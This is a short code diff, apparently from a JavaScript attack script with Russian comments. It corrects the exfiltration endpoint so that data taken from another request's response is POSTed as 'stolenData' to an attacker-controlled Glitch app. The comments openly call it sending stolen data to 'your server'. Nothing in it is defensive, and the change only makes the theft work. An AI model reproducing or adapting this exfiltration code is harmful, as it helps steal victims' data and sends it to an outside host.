@@ -22,7 +22,7 @@
 
                     // Отправка украденных данных на ваш сервер на Glitch
                     var exfil = new XMLHttpRequest();
-                    exfil.open('POST', 'https://glitch.com/edit/#!/spangle-leeward-layer', true);  // Ваша ссылка на сервер
+                    exfil.open('POST', 'https://spangle-leeward-layer.glitch.me', true);  // Ваша ссылка на сервер
                     exfil.setRequestHeader('Content-Type', 'application/json');
                     exfil.send(JSON.stringify({ stolenData: xhr.responseText }));
                 }
